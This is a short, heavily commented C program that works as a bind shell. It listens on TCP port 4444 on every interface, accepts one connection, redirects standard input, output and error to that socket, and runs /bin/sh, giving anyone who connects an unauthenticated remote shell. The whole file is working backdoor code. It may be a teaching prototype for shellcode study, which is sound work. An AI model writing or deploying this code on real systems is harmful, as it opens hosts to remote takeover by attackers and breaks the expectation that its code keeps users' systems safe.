#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>


int main()
{
	// Create sockaddr_in struct
	struct sockaddr_in addr;
	// AF_INET for IPv4
	addr.sin_family = AF_INET;
	// Set port number to 4444
	addr.sin_port = htons(4444);
	// Listen on any interface
	addr.sin_addr.s_addr = INADDR_ANY;

    // Create the sock
	// AF_INET for IPv4
	// SOCK_STREAM for TCP connection
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	
	// Bind address to sock
	bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

	// Use the created sock to listen for connections
	listen(sockfd, 0);

	// Accept connections
	int connfd = accept(sockfd, NULL, NULL);

	// Redirect the STDIN, STDOUT and STDERR into the socket
	for (int i = 0; i < 3; i++)
    {
        dup2(connfd, i);
    }

	// Execute /bin/sh
	execve("/bin/sh", NULL, NULL);

}
